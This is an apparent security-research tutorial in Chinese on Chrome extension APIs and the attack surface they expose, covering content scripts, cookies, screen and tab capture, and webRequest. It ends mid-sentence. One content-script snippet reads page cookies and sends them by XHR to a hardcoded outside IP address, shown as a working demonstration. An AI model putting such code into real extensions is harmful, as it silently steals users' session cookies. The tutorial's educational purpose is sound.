**作者：LoRexxar'@知道创宇404实验室  
时间：2019年12月5日  
English version: **
在2019年初，微软正式选择了Chromium作为默认浏览器，并放弃edge的发展。并在19年4月8日，Edge正式放出了基于Chromium开发的Edge
Dev浏览器，并提供了兼容Chrome
Ext的配套插件管理。再加上国内的大小国产浏览器大多都是基于Chromium开发的，Chrome的插件体系越来越影响着广大的人群。
在这种背景下，Chrome Ext的安全问题也应该受到应有的关注，《从0开始入门Chrome
Ext安全》就会从最基础的插件开发开始，逐步研究插件本身的恶意安全问题，恶意网页如何利用插件漏洞攻击浏览器等各种视角下的安全问题。
  * [从0开始入门Chrome Ext安全（一） -- 了解一个Chrome Ext](https://paper.seebug.org/1082/)
上篇我们主要聊了关于最基础插件开发，之后我们就要探讨关于Chrome Ext的安全性问题了，这篇文章我们主要围绕Chrome
Ext的api开始，探讨在插件层面到底能对浏览器进行多少种操作。
# 从一个测试页面开始
为了探讨插件的功能权限范围，首先我们设置一个简单的页面
    test pages
接下来我们将围绕Chrome ext api的功能探讨各种可能存在的安全问题以及攻击层面。
# Chrome ext js
## content-script
content-script是插件的核心功能代码地方，一般来说，主要的js代码都会出现在content-script中。
它的引入方式在上一篇文章中提到过，要在manfest.json中设置
    "content_scripts": [
       {
         "matches": ["http://*.nytimes.com/*"],
         "css": ["myStyles.css"],
         "js": ["contentScript.js"]
       }
     ],
  * 
而content_script js
主要的特点在于他与页面同时加载，可以访问dom，并且也能调用extension、runtime等部分api，但并不多，主要用于和页面的交互。
`content_script js`可以通过设置`run_at`来设置相对应脚本加载的时机。
  * document_idle 为默认值，一般来说会在页面dom加载完成之后，window.onload事件触发之前
  * document_start 为css加载之后，构造页面dom之前
  * document_end 则为dom完成之后，图片等资源加载之前
并且，`content_script js`还允许通过设置`all_frames`来使得`content_script
js`作用于页面内的所有`frame`，这个配置默认为关闭，因为这本身是个不安全的配置，这个问题会在后面提到。
在`content_script js`中可以直接访问以下Chrome Ext api：
  * i18n
  * storage
  * runtime:
    * connect
    * getManifest
    * getURL
    * id
    * onConnect
    * onMessage
    * sendMessage
在了解完基本的配置后，我们就来看看`content_script js`可以对页面造成什么样的安全问题。
### 安全问题
对于`content_script
js`来说，首当其中的一个问题就是，插件可以获取页面的dom，换言之，插件可以操作页面内的所有dom，其中就包括非httponly的cookie.
这里我们简单把`content_script js`中写入下面的代码
    console.log(document.cookie);
    console.log(document.documentElement.outerHTML);
    var xhr = new XMLHttpRequest();
    xhr.open("get", "http://212.129.137.248?a="+document.cookie, false);
    xhr.send()
然后加载插件之后刷新页面 ![
](https://images.seebug.org/content/images/2019/12/334b9d65-71e3-4e1d-9200-19ea24a36470.png-w331s)
可以看到成功获取到了页面内dom的信息，并且如果我们通过xhr跨域传出消息之后，我们在后台也成功收到了这个请求。 ![
](https://images.seebug.org/content/images/2019/12/106115ba-3864-49b4-8a93-d7641add79db.png-w331s)
这也就意味着，如果插件作者在插件中恶意修改dom，甚至获取dom值传出都可以通过浏览器使用者无感的方式进行。
在整个浏览器的插件体系内，各个层面都存在着这个问题，其中`content_script js`、`injected script js`和`devtools
js`都可以直接访问操作dom，而popup js和background
js都可以通过chrome.tabs.executeScript来动态执行js，同样可以执行js修改dom。
除了前面的问题以外，事实上`content_script js`能访问到的chrome api非常之少，也涉及不到什么安全性，这里暂且不提。
## popup/background js
popup js和backround js两个主要的区别在于加载的时机，由于他们不能访问dom，所以这两部分的js在浏览器中主要依靠事件驱动。
其中的主要区别是，background
js在事件触发之后会持续执行，而且在关闭所有可见视图和端口之前不会结束。值得注意的是，页面打开、点击拓展按钮都连接着相应的事件，而不会直接影响插件的加载。
而除此之外，这两部分js最重要的特性在于，他们可以调用大部分的chrome ext api，在后面我们将一起探索一下各种api。
## devtools js
devtools js在插件体系中是一个比较特别的体系，如果我们一般把F12叫做开发者工具的话，那devtools js就是开发者工具的开发者工具。
权限和域限制大体上和content js 一致，而唯一特别的是他可以操作3个特殊的api：
  * chrome.devtools.panels：面板相关；
  * chrome.devtools.inspectedWindow：获取被审查窗口的有关信息；
  * chrome.devtools.network：获取有关网络请求的信息；
而这三个api也主要是用于修改F12和获取信息的，其他的就不赘述了。
# Chrome Ext Api
## chrome.cookies
chrome.cookies api需要给与域权限以及cookies权限，在manfest.json中这样定义：
          {
            "name": "My extension",
            ...
            "permissions": [
              "cookies",
              "*://*.google.com"
            ],
            ...
          }
当申请这样的权限之后，我们可以通过调用chrome.cookies去获取google.com域下的所有cookie.
其中一共包含5个方法
  * get - chrome.cookies.get(object details, function callback)  
获取符合条件的cookie
  * getAll - chrome.cookies.getAll(object details, function callback)  
获取符合条件的所有cookie
  * set - chrome.cookies.set(object details, function callback)  
设置cookie
  * remove - chrome.cookies.remove(object details, function callback)  
删除cookie
  * getAllCookieStores - chrome.cookies.getAllCookieStores(function callback)  
列出所有储存的cookie
和一个事件
  * chrome.cookies.onChanged.addListener(function callback)  
当cookie删除或者更改导致的事件
当插件拥有cookie权限时，他们可以读写所有浏览器存储的cookie.
![
](https://images.seebug.org/content/images/2019/12/2fc34b5d-7bca-4737-9be1-5ca70dc747e7.png-w331s)
## chrome.contentSettings
chrome.contentSettings api
用来设置浏览器在访问某个网页时的基础设置，其中包括cookie、js、插件等很多在访问网页时生效的配置。
在manifest中需要申请contentSettings的权限
      {
        "name": "My extension",
        ...
        "permissions": [
          "contentSettings"
        ],
        ...
      }
在content.Setting的api中，方法主要用于修改设置
    - ResourceIdentifier
    - Scope
    - ContentSetting
    - CookiesContentSetting
    - ImagesContentSetting
    - JavascriptContentSetting
    - LocationContentSetting
    - PluginsContentSetting
    - PopupsContentSetting
    - NotificationsContentSetting
    - FullscreenContentSetting
    - MouselockContentSetting
    - MicrophoneContentSetting
    - CameraContentSetting
    - PpapiBrokerContentSetting
    - MultipleAutomaticDownloadsContentSetting
因为没有涉及到太重要的api，这里就暂时不提
## chrome.desktopCapture
chrome.desktopCapture可以被用来对整个屏幕，浏览器或者某个页面截图（实时）。
在manifest中需要申请desktopCapture的权限，并且浏览器提供了获取媒体流的一个方法。
  * chooseDesktopMedia - integer chrome.desktopCapture.chooseDesktopMedia(array of DesktopCaptureSourceType sources, tabs.Tab targetTab, function callback)
  * cancelChooseDesktopMedia - chrome.desktopCapture.cancelChooseDesktopMedia(integer desktopMediaRequestId)
其中DesktopCaptureSourceType被设置为"screen", "window", "tab", or "audio"的列表。
获取到相应截图之后，该方法会将相对应的媒体流id传给回调函数，这个id可以通过getUserMedia这个api来生成相应的id，这个新创建的streamid只能使用一次并且会在几秒后过期。
这里用一个简单的demo来示范
    function gotStream(stream) {
      console.log("Received local stream");
      var video = document.querySelector("video");
      video.src = URL.createObjectURL(stream);
      localstream = stream;
      stream.onended = function() { console.log("Ended"); };
    }
    chrome.desktopCapture.chooseDesktopMedia(
    ["screen"], function (id) {
        navigator.webkitGetUserMedia({
            audio: false,
            video: {
                mandatory: {
                    chromeMediaSource: "desktop",
                    chromeMediaSourceId: id
                }
            }
        }, gotStream);
    }
    });
这里获取的是一个实时的视频流
![
](https://images.seebug.org/content/images/2019/12/a0352dea-f942-488a-965b-70bf0be8d5fd.png-w331s)
## chrome.pageCapture
chrome.pageCapture的大致逻辑和desktopCapture比较像，在manifest需要申请pageCapture的权限
      {
        "name": "My extension",
        ...
        "permissions": [
          "pageCapture"
        ],
        ...
      }
它也只支持saveasMHTML一种方法
  * saveAsMHTML - chrome.pageCapture.saveAsMHTML(object details, function callback)
通过调用这个方法可以获取当前浏览器任意tab下的页面源码，并保存为blob格式的对象。
唯一的问题在于需要先知道tabid
![
](https://images.seebug.org/content/images/2019/12/3450ac03-b6a4-4a74-827b-b1de2360ccca.png-w331s)
## chrome.tabCapture
chrome.tabCapture和chrome.desktopCapture类似，其主要功能区别在于，tabCapture可以捕获标签页的视频和音频，比desktopCapture来说要更加针对。
同样的需要提前声明tabCapture权限。
主要方法有
  * capture - chrome.tabCapture.capture( CaptureOptions options, function callback)
  * getCapturedTabs - chrome.tabCapture.getCapturedTabs(function callback)
  * captureOffscreenTab - chrome.tabCapture.captureOffscreenTab(string startUrl, CaptureOptions options, function callback)
  * getMediaStreamId - chrome.tabCapture.getMediaStreamId(object options, function callback)
这里就不细讲了，大部分api都是用来捕获媒体流的，进一步使用就和desktopCapture中提到的使用方法相差不大。
## chrome.webRequest
chrome.webRequest主要用户观察和分析流量，并且允许在运行过程中拦截、阻止或修改请求。
在manifest中这个api除了需要webRequest以外，还有有相应域的权限，比如`*://*.*:*`，而且要注意的是如果是需要拦截请求还需要webRequestBlocking的权限
    {
            "name": "My extension",
            ...
            "permissions": [
              "webRequest",
              "*://*.google.com/"
            ],
            ...
          }
  * 
在具体了解这个api之前，首先我们必须了解一次请求在浏览器层面的流程，以及相应的事件触发。
![